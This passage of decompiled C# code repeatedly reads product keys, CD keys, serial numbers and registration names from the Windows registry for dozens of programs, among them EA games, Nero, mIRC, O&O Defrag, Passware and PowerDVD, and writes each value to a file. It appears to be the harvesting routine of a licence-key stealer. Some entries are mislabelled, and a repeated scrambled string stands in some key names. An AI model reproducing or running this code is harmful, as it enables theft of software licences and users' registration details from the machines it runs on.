					IL_2a8b:
					num = 606;
					streamWriter.WriteLine("Medal of Honor: Allied Assault : " + text102);
					goto IL_2aa5;
					IL_2aa5:
					num = 607;
					streamWriter.Flush();
					goto IL_2ab3;
					IL_2ab3:
					num = 608;
					streamWriter.WriteLine("");
					goto IL_2ac6;
					IL_2ac6:
					num = 609;
					streamWriter.Flush();
					goto IL_2ad4;
					IL_2ad4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2adc;
					IL_2adc:
					num = 611;
					text103 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead", "ergc", null));
					goto IL_2afa;
					IL_2afa:
					num = 612;
					streamWriter.WriteLine("Medal of Honor: Allied Assault: Breakthrough : " + text103);
					goto IL_2b14;
					IL_2b14:
					num = 613;
					streamWriter.Flush();
					goto IL_2b22;
					IL_2b22:
					num = 614;
					streamWriter.WriteLine("");
					goto IL_2b35;
					IL_2b35:
					num = 615;
					streamWriter.Flush();
					goto IL_2b43;
					IL_2b43:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2b4b;
					IL_2b4b:
					num = 617;
					text104 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\mIRC", "UserName", null));
					goto IL_2b69;
					IL_2b69:
					num = 618;
					streamWriter.WriteLine("Medal of Honor: Heroes 2 : " + text104);
					goto IL_2b83;
					IL_2b83:
					num = 619;
					streamWriter.Flush();
					goto IL_2b91;
					IL_2b91:
					num = 620;
					streamWriter.WriteLine("");
					goto IL_2ba4;
					IL_2ba4:
					num = 621;
					streamWriter.Flush();
					goto IL_2bb2;
					IL_2bb2:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2bba;
					IL_2bba:
					num = 623;
					text105 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\mIRC", "License", null));
					goto IL_2bd8;
					IL_2bd8:
					num = 624;
					streamWriter.WriteLine("mIRC : " + text105);
					goto IL_2bf2;
					IL_2bf2:
					num = 625;
					streamWriter.Flush();
					goto IL_2c00;
					IL_2c00:
					num = 626;
					streamWriter.WriteLine("");
					goto IL_2c13;
					IL_2c13:
					num = 627;
					streamWriter.Flush();
					goto IL_2c21;
					IL_2c21:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2c29;
					IL_2c29:
					num = 629;
					text106 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2002", "ergc", null));
					goto IL_2c47;
					IL_2c47:
					num = 630;
					streamWriter.WriteLine("Nascar Racing 2002 : " + text106);
					goto IL_2c61;
					IL_2c61:
					num = 631;
					streamWriter.Flush();
					goto IL_2c6f;
					IL_2c6f:
					num = 632;
					streamWriter.WriteLine("");
					goto IL_2c82;
					IL_2c82:
					num = 633;
					streamWriter.Flush();
					goto IL_2c90;
					IL_2c90:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2c98;
					IL_2c98:
					num = 635;
					text107 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2003", "ergc", null));
					goto IL_2cb6;
					IL_2cb6:
					num = 636;
					streamWriter.WriteLine("Nascar Racing 2003 : " + text107);
					goto IL_2cd0;
					IL_2cd0:
					num = 637;
					streamWriter.Flush();
					goto IL_2cde;
					IL_2cde:
					num = 638;
					streamWriter.WriteLine("");
					goto IL_2cf1;
					IL_2cf1:
					num = 639;
					streamWriter.Flush();
					goto IL_2cff;
					IL_2cff:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2d07;
					IL_2d07:
					num = 641;
					text108 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002", "ergc", null));
					goto IL_2d25;
					IL_2d25:
					num = 642;
					streamWriter.WriteLine("NHL 2002 : " + text108);
					goto IL_2d3f;
					IL_2d3f:
					num = 643;
					streamWriter.Flush();
					goto IL_2d4d;
					IL_2d4d:
					num = 644;
					streamWriter.WriteLine("");
					goto IL_2d60;
					IL_2d60:
					num = 645;
					streamWriter.Flush();
					goto IL_2d6e;
					IL_2d6e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2d76;
					IL_2d76:
					num = 647;
					text109 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 2003", "ergc", null));
					goto IL_2d94;
					IL_2d94:
					num = 648;
					streamWriter.WriteLine("NBA LIVE 2003 : " + text109);
					goto IL_2dae;
					IL_2dae:
					num = 649;
					streamWriter.Flush();
					goto IL_2dbc;
					IL_2dbc:
					num = 650;
					streamWriter.WriteLine("");
					goto IL_2dcf;
					IL_2dcf:
					num = 651;
					streamWriter.Flush();
					goto IL_2ddd;
					IL_2ddd:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2de5;
					IL_2de5:
					num = 653;
					text110 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 2004", "ergc", null));
					goto IL_2e03;
					IL_2e03:
					num = 654;
					streamWriter.WriteLine("NBA LIVE 2004 : " + text110);
					goto IL_2e1d;
					IL_2e1d:
					num = 655;
					streamWriter.Flush();
					goto IL_2e2b;
					IL_2e2b:
					num = 656;
					streamWriter.WriteLine("");
					goto IL_2e3e;
					IL_2e3e:
					num = 657;
					streamWriter.Flush();
					goto IL_2e4c;
					IL_2e4c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2e54;
					IL_2e54:
					num = 659;
					text111 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 07", "ergc", null));
					goto IL_2e72;
					IL_2e72:
					num = 660;
					streamWriter.WriteLine("NBA LIVE 07 : " + text111);
					goto IL_2e8c;
					IL_2e8c:
					num = 661;
					streamWriter.Flush();
					goto IL_2e9a;
					IL_2e9a:
					num = 662;
					streamWriter.WriteLine("");
					goto IL_2ead;
					IL_2ead:
					num = 663;
					streamWriter.Flush();
					goto IL_2ebb;
					IL_2ebb:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2ec3;
					IL_2ec3:
					num = 665;
					text112 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA Live 08", "ergc", null));
					goto IL_2ee1;
					IL_2ee1:
					num = 666;
					streamWriter.WriteLine("NBA Live 08 : " + text112);
					goto IL_2efb;
					IL_2efb:
					num = 667;
					streamWriter.Flush();
					goto IL_2f09;
					IL_2f09:
					num = 668;
					streamWriter.WriteLine("");
					goto IL_2f1c;
					IL_2f1c:
					num = 669;
					streamWriter.Flush();
					goto IL_2f2a;
					IL_2f2a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2f32;
					IL_2f32:
					num = 671;
					text113 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed Carbon", "ergc", null));
					goto IL_2f50;
					IL_2f50:
					num = 672;
					streamWriter.WriteLine("Need for Speed Carbon : " + text113);
					goto IL_2f6a;
					IL_2f6a:
					num = 673;
					streamWriter.Flush();
					goto IL_2f78;
					IL_2f78:
					num = 674;
					streamWriter.WriteLine("");
					goto IL_2f8b;
					IL_2f8b:
					num = 675;
					streamWriter.Flush();
					goto IL_2f99;
					IL_2f99:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2fa1;
					IL_2fa1:
					num = 677;
					text114 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2", "ergc", null));
					goto IL_2fbf;
					IL_2fbf:
					num = 678;
					streamWriter.WriteLine("Need For Speed Hot Pursuit 2 : " + text114);
					goto IL_2fd9;
					IL_2fd9:
					num = 679;
					streamWriter.Flush();
					goto IL_2fe7;
					IL_2fe7:
					num = 680;
					streamWriter.WriteLine("");
					goto IL_2ffa;
					IL_2ffa:
					num = 681;
					streamWriter.Flush();
					goto IL_3008;
					IL_3008:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3010;
					IL_3010:
					num = 683;
					text115 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need for Speed Most Wanted", "ergc", null));
					goto IL_302e;
					IL_302e:
					num = 684;
					streamWriter.WriteLine("Need for Speed Most Wanted : " + text115);
					goto IL_3048;
					IL_3048:
					num = 685;
					streamWriter.Flush();
					goto IL_3056;
					IL_3056:
					num = 686;
					streamWriter.WriteLine("");
					goto IL_3069;
					IL_3069:
					num = 687;
					streamWriter.Flush();
					goto IL_3077;
					IL_3077:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_307f;
					IL_307f:
					num = 689;
					text116 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed ProStreet", "ergc", null));
					goto IL_309d;
					IL_309d:
					num = 690;
					streamWriter.WriteLine("Need for Speed ProStreet : " + text116);
					goto IL_30b7;
					IL_30b7:
					num = 691;
					streamWriter.Flush();
					goto IL_30c5;
					IL_30c5:
					num = 692;
					streamWriter.WriteLine("");
					goto IL_30d8;
					IL_30d8:
					num = 693;
					streamWriter.Flush();
					goto IL_30e6;
					IL_30e6:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_30ee;
					IL_30ee:
					num = 695;
					text117 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Underground", "ergc", null));
					goto IL_310c;
					IL_310c:
					num = 696;
					streamWriter.WriteLine("Need For Speed Underground : " + text117);
					goto IL_3126;
					IL_3126:
					num = 697;
					streamWriter.Flush();
					goto IL_3134;
					IL_3134:
					num = 698;
					streamWriter.WriteLine("");
					goto IL_3147;
					IL_3147:
					num = 699;
					streamWriter.Flush();
					goto IL_3155;
					IL_3155:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_315d;
					IL_315d:
					num = 701;
					text118 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Need for Speed Underground 2", "ergc", null));
					goto IL_317b;
					IL_317b:
					num = 702;
					streamWriter.WriteLine("Need For Speed Underground 2 : " + text118);
					goto IL_3195;
					IL_3195:
					num = 703;
					streamWriter.Flush();
					goto IL_31a3;
					IL_31a3:
					num = 704;
					streamWriter.WriteLine("");
					goto IL_31b6;
					IL_31b6:
					num = 705;
					streamWriter.Flush();
					goto IL_31c4;
					IL_31c4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_31cc;
					IL_31cc:
					num = 707;
					text119 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Nero - Burning Rom\\Info", "Serial6", null));
					goto IL_31ea;
					IL_31ea:
					num = 708;
					streamWriter.WriteLine("Nero - Burning Rom : " + text119);
					goto IL_3204;
					IL_3204:
					num = 709;
					streamWriter.Flush();
					goto IL_3212;
					IL_3212:
					num = 710;
					streamWriter.WriteLine("");
					goto IL_3225;
					IL_3225:
					num = 711;
					streamWriter.Flush();
					goto IL_3233;
					IL_3233:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_323b;
					IL_323b:
					num = 713;
					text120 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nero\\Installation\\Families\\Nero 7\\Info", "Serial7_1191197813", null));
					goto IL_3259;
					IL_3259:
					num = 714;
					streamWriter.WriteLine("Nero 7 : " + text120);
					goto IL_3273;
					IL_3273:
					num = 715;
					streamWriter.Flush();
					goto IL_3281;
					IL_3281:
					num = 716;
					streamWriter.WriteLine("");
					goto IL_3294;
					IL_3294:
					num = 717;
					streamWriter.Flush();
					goto IL_32a2;
					IL_32a2:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_32aa;
					IL_32aa:
					num = 719;
					text121 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Nero\\Installation\\Families\\Nero 8\\Info", "Serial8_1194709660", null));
					goto IL_32c8;
					IL_32c8:
					num = 720;
					streamWriter.WriteLine("Nero 8 : " + text121);
					goto IL_32e2;
					IL_32e2:
					num = 721;
					streamWriter.Flush();
					goto IL_32f0;
					IL_32f0:
					num = 722;
					streamWriter.WriteLine("");
					goto IL_3303;
					IL_3303:
					num = 723;
					streamWriter.Flush();
					goto IL_3311;
					IL_3311:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3319;
					IL_3319:
					num = 725;
					text122 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002", "ergc", null));
					goto IL_3337;
					IL_3337:
					num = 726;
					streamWriter.WriteLine("NHL 2002 : " + text122);
					goto IL_3351;
					IL_3351:
					num = 727;
					streamWriter.Flush();
					goto IL_335f;
					IL_335f:
					num = 728;
					streamWriter.WriteLine("");
					goto IL_3372;
					IL_3372:
					num = 729;
					streamWriter.Flush();
					goto IL_3380;
					IL_3380:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3388;
					IL_3388:
					num = 731;
					text123 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2003", "ergc", null));
					goto IL_33a6;
					IL_33a6:
					num = 732;
					streamWriter.WriteLine("NHL 2003 : " + text123);
					goto IL_33c0;
					IL_33c0:
					num = 733;
					streamWriter.Flush();
					goto IL_33ce;
					IL_33ce:
					num = 734;
					streamWriter.WriteLine("");
					goto IL_33e1;
					IL_33e1:
					num = 735;
					streamWriter.Flush();
					goto IL_33ef;
					IL_33ef:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_33f7;
					IL_33f7:
					num = 737;
					text124 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2004", "ergc", null));
					goto IL_3415;
					IL_3415:
					num = 738;
					streamWriter.WriteLine("NHL 2004 : " + text124);
					goto IL_342f;
					IL_342f:
					num = 739;
					streamWriter.Flush();
					goto IL_343d;
					IL_343d:
					num = 740;
					streamWriter.WriteLine("");
					goto IL_3450;
					IL_3450:
					num = 741;
					streamWriter.Flush();
					goto IL_345e;
					IL_345e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3466;
					IL_3466:
					num = 743;
					text125 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2005", "ergc", null));
					goto IL_3484;
					IL_3484:
					num = 744;
					streamWriter.WriteLine("NHL 2005 : " + text125);
					goto IL_349e;
					IL_349e:
					num = 745;
					streamWriter.Flush();
					goto IL_34ac;
					IL_34ac:
					num = 746;
					streamWriter.WriteLine("");
					goto IL_34bf;
					IL_34bf:
					num = 747;
					streamWriter.Flush();
					goto IL_34cd;
					IL_34cd:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_34d5;
					IL_34d5:
					num = 749;
					text126 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Westwood\\Nox", "Serial", null));
					goto IL_34f3;
					IL_34f3:
					num = 750;
					streamWriter.WriteLine("NOX : " + text126);
					goto IL_350d;
					IL_350d:
					num = 751;
					streamWriter.Flush();
					goto IL_351b;
					IL_351b:
					num = 752;
					streamWriter.WriteLine("");
					goto IL_352e;
					IL_352e:
					num = 753;
					streamWriter.Flush();
					goto IL_353c;
					IL_353c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3544;
					IL_3544:
					num = 755;
					text127 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\NuMega\\SmartCheck", "Serial", null));
					goto IL_3562;
					IL_3562:
					num = 756;
					streamWriter.WriteLine("Numega SmartCheck : " + text127);
					goto IL_357c;
					IL_357c:
					num = 757;
					streamWriter.Flush();
					goto IL_358a;
					IL_358a:
					num = 758;
					streamWriter.WriteLine("");
					goto IL_359d;
					IL_359d:
					num = 759;
					streamWriter.Flush();
					goto IL_35ab;
					IL_35ab:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_35b3;
					IL_35b3:
					num = 761;
					text128 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\OnlineTVPlayer\\RegInfo", "name", null));
					goto IL_35d1;
					IL_35d1:
					num = 762;
					streamWriter.WriteLine("OnlineTVPlayer (Name) : " + text128);
					goto IL_35eb;
					IL_35eb:
					num = 763;
					streamWriter.Flush();
					goto IL_35f9;
					IL_35f9:
					num = 764;
					streamWriter.WriteLine("");
					goto IL_360c;
					IL_360c:
					num = 765;
					streamWriter.Flush();
					goto IL_361a;
					IL_361a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3622;
					IL_3622:
					num = 767;
					text129 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\OnlineTVPlayer\\RegInfo", "serial", null));
					goto IL_3640;
					IL_3640:
					num = 768;
					streamWriter.WriteLine("OnlineTVPlayer (Serial) : " + text129);
					goto IL_365a;
					IL_365a:
					num = 769;
					streamWriter.Flush();
					goto IL_3668;
					IL_3668:
					num = 770;
					streamWriter.WriteLine("");
					goto IL_367b;
					IL_367b:
					num = 771;
					streamWriter.Flush();
					goto IL_3689;
					IL_3689:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3691;
					IL_3691:
					num = 773;
					text130 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "User", null));
					goto IL_36af;
					IL_36af:
					num = 774;
					streamWriter.WriteLine("O&O Defrag 8.0 (Username) : " + text130);
					goto IL_36c9;
					IL_36c9:
					num = 775;
					streamWriter.Flush();
					goto IL_36d7;
					IL_36d7:
					num = 776;
					streamWriter.WriteLine("");
					goto IL_36ea;
					IL_36ea:
					num = 777;
					streamWriter.Flush();
					goto IL_36f8;
					IL_36f8:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3700;
					IL_3700:
					num = 779;
					text131 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "Company", null));
					goto IL_371e;
					IL_371e:
					num = 780;
					streamWriter.WriteLine("O&O Defrag 8.0 (Company) : " + text131);
					goto IL_3738;
					IL_3738:
					num = 781;
					streamWriter.Flush();
					goto IL_3746;
					IL_3746:
					num = 782;
					streamWriter.WriteLine("");
					goto IL_3759;
					IL_3759:
					num = 783;
					streamWriter.Flush();
					goto IL_3767;
					IL_3767:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_376f;
					IL_376f:
					num = 785;
					text132 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "SerialNo", null));
					goto IL_378d;
					IL_378d:
					num = 786;
					streamWriter.WriteLine("O&O Defrag 8.0 (Serial) : " + text132);
					goto IL_37a7;
					IL_37a7:
					num = 787;
					streamWriter.Flush();
					goto IL_37b5;
					IL_37b5:
					num = 788;
					streamWriter.WriteLine("");
					goto IL_37c8;
					IL_37c8:
					num = 789;
					streamWriter.Flush();
					goto IL_37d6;
					IL_37d6:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_37de;
					IL_37de:
					num = 791;
					text133 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\PowerQuest\\PartitionMagic\\8.0\\UserInfo", "SerialNumber", null));
					goto IL_37fc;
					IL_37fc:
					num = 792;
					streamWriter.WriteLine("Partition Magic 8.0 : " + text133);
					goto IL_3816;
					IL_3816:
					num = 793;
					streamWriter.Flush();
					goto IL_3824;
					IL_3824:
					num = 794;
					streamWriter.WriteLine("");
					goto IL_3837;
					IL_3837:
					num = 795;
					streamWriter.Flush();
					goto IL_3845;
					IL_3845:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_384d;
					IL_384d:
					num = 797;
					text134 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "Name", null));
					goto IL_386b;
					IL_386b:
					num = 798;
					streamWriter.WriteLine("Passware Encryption Analyzer (Name) : " + text134);
					goto IL_3885;
					IL_3885:
					num = 799;
					streamWriter.Flush();
					goto IL_3893;
					IL_3893:
					num = 800;
					streamWriter.WriteLine("");
					goto IL_38a6;
					IL_38a6:
					num = 801;
					streamWriter.Flush();
					goto IL_38b4;
					IL_38b4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_38bc;
					IL_38bc:
					num = 803;
					text135 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "SerialNumber", null));
					goto IL_38da;
					IL_38da:
					num = 804;
					streamWriter.WriteLine("Passware Encryption Analyzer (License) : " + text135);
					goto IL_38f4;
					IL_38f4:
					num = 805;
					streamWriter.Flush();
					goto IL_3902;
					IL_3902:
					num = 806;
					streamWriter.WriteLine("");
					goto IL_3915;
					IL_3915:
					num = 807;
					streamWriter.Flush();
					goto IL_3923;
					IL_3923:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_392b;
					IL_392b:
					num = 809;
					text136 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "Serial", null));
					goto IL_3949;
					IL_3949:
					num = 810;
					streamWriter.WriteLine("Passware Encryption Analyzer (Serial) : " + text136);
					goto IL_3963;
					IL_3963:
					num = 811;
					streamWriter.Flush();
					goto IL_3971;
					IL_3971:
					num = 812;
					streamWriter.WriteLine("");
					goto IL_3984;
					IL_3984:
					num = 813;
					streamWriter.Flush();
					goto IL_3992;
					IL_3992:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_399a;
					IL_399a:
					num = 815;
					text137 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows pYrTgbzWFEpYpYrT\\7\\Registration", "License", null));
					goto IL_39b8;
					IL_39b8:
					num = 816;
					streamWriter.WriteLine("Passware Windows pYrTgbzWFEpYpYrT (License) : " + text137);
					goto IL_39d2;
					IL_39d2:
					num = 817;
					streamWriter.Flush();
					goto IL_39e0;
					IL_39e0:
					num = 818;
					streamWriter.WriteLine("");
					goto IL_39f3;
					IL_39f3:
					num = 819;
					streamWriter.Flush();
					goto IL_3a01;
					IL_3a01:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3a09;
					IL_3a09:
					num = 821;
					text138 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows pYrTgbzWFEpYpYrT\\7\\Registration", "Name", null));
					goto IL_3a27;
					IL_3a27:
					num = 822;
					streamWriter.WriteLine("Passware Windows pYrTgbzWFEpYpYrT (Name) : " + text138);
					goto IL_3a41;
					IL_3a41:
					num = 823;
					streamWriter.Flush();
					goto IL_3a4f;
					IL_3a4f:
					num = 824;
					streamWriter.WriteLine("");
					goto IL_3a62;
					IL_3a62:
					num = 825;
					streamWriter.Flush();
					goto IL_3a70;
					IL_3a70:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3a78;
					IL_3a78:
					num = 827;
					text139 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows pYrTgbzWFEpYpYrT\\7\\Registration", "Serial", null));
					goto IL_3a96;
					IL_3a96:
					num = 828;
					streamWriter.WriteLine("Passware Windows pYrTgbzWFEpYpYrT (Serial) : " + text139);
					goto IL_3ab0;
					IL_3ab0:
					num = 829;
					streamWriter.Flush();
					goto IL_3abe;
					IL_3abe:
					num = 830;
					streamWriter.WriteLine("");
					goto IL_3ad1;
					IL_3ad1:
					num = 831;
					streamWriter.Flush();
					goto IL_3adf;
					IL_3adf:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3ae7;
					IL_3ae7:
					num = 833;
					text140 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\CyberLink\\PowerDVD", "UI_RMK", null));
					goto IL_3b05;
					IL_3b05:
					num = 834;
					streamWriter.WriteLine("PowerDvD : " + text140);
					goto IL_3b1f;
					IL_3b1f:
					num = 835;
					streamWriter.Flush();
					goto IL_3b2d;
					IL_3b2d:
					num = 836;
					streamWriter.WriteLine("");
					goto IL_3b40;
					IL_3b40:
					num = 837;
					streamWriter.Flush();
					goto IL_3b4e;
					IL_3b4e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3b56;
					IL_3b56:
					num = 839;
					text141 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\EnTech\\PowerStrip", "pYrTgbzWFEpYpYrT", null));
					goto IL_3b74;
					IL_3b74:
					num = 840;
					streamWriter.WriteLine("PowerStrip : " + text141);
					goto IL_3b8e;
					IL_3b8e:
					num = 841;
					streamWriter.Flush();
					goto IL_3b9c;
					IL_3b9c:
					num = 842;
					streamWriter.WriteLine("");
					goto IL_3baf;
					IL_3baf:
					num = 843;
					streamWriter.Flush();
					goto IL_3bbd;
					IL_3bbd:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3bc5;
					IL_3bc5:
					num = 845;
					text142 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\KONAMI\\PES2008", "code", null));
					goto IL_3be3;
					IL_3be3:
					num = 846;
					streamWriter.WriteLine("Pro Evolution Soccer 2008 : " + text142);
					goto IL_3bfd;
					IL_3bfd:
					num = 847;
					streamWriter.Flush();
					goto IL_3c0b;
					IL_3c0b:
					num = 848;
					streamWriter.WriteLine("");
					goto IL_3c1e;
					IL_3c1e:
					num = 849;
					streamWriter.Flush();
					goto IL_3c2c;
					IL_3c2c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3c34;
					IL_3c34:
					num = 851;
					text143 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Red Storm Entertainment\\RAVENSHIELD", "CDKey", null));
					goto IL_3c52;
					IL_3c52:
					num = 852;
					streamWriter.WriteLine("Rainbow Six III RavenShield : " + text143);
					goto IL_3c6c;
					IL_3c6c:
					num = 853;
					streamWriter.Flush();
					goto IL_3c7a;
					IL_3c7a:
					num = 854;
					streamWriter.WriteLine("");
					goto IL_3c8d;
					IL_3c8d:
					num = 855;
					streamWriter.Flush();
					goto IL_3c9b;
					IL_3c9b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3ca3;
					IL_3ca3:
					num = 857;
					text144 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition", "ergc", null));
					goto IL_3cc1;
					IL_3cc1:
					num = 858;
					streamWriter.WriteLine("Shogun Total War Warlord Edition : " + text144);
					goto IL_3cdb;
					IL_3cdb:
					num = 859;
					streamWriter.Flush();
					goto IL_3ce9;
					IL_3ce9:
					num = 860;
					streamWriter.WriteLine("");
					goto IL_3cfc;
					IL_3cfc:
					num = 861;
					streamWriter.Flush();
					goto IL_3d0a;
					IL_3d0a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3d12;
					IL_3d12:
					num = 863;
					text145 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Atari\\Sid Meier's Pirates!", "CDKey", null));
					goto IL_3d30;
					IL_3d30:
					num = 864;
					streamWriter.WriteLine("Sid(Meier) 's Pirates! : " + text145);
					goto IL_3d4a;
					IL_3d4a:
					num = 865;
					streamWriter.Flush();
					goto IL_3d58;
					IL_3d58:
					num = 866;
					streamWriter.WriteLine("");
					goto IL_3d6b;
					IL_3d6b:
					num = 867;
					streamWriter.Flush();
					goto IL_3d79;
					IL_3d79:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3d81;
					IL_3d81:
					num = 869;
					text146 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Ubisoft\\SILENT HUNTER III\\Keys", "DiscKey_SH3", null));
					goto IL_3d9f;
					IL_3d9f:
					num = 870;
					streamWriter.WriteLine("Sid(Meier) 's Pirates! : " + text146);
					goto IL_3db9;
					IL_3db9:
					num = 871;
					streamWriter.Flush();
					goto IL_3dc7;
					IL_3dc7:
					num = 872;
					streamWriter.WriteLine("");
					goto IL_3dda;
					IL_3dda:
					num = 873;
					streamWriter.Flush();
					goto IL_3de8;
					IL_3de8:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3df0;
					IL_3df0:
					num = 875;
					text147 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\ Sim City 4 Deluxe", "ergc", null));
					goto IL_3e0e;
					IL_3e0e:
					num = 876;
					streamWriter.WriteLine("Sim City 4 Deluxe : " + text147);
					goto IL_3e28;
					IL_3e28:
					num = 877;
					streamWriter.Flush();
					goto IL_3e36;
					IL_3e36:
					num = 878;
					streamWriter.WriteLine("");
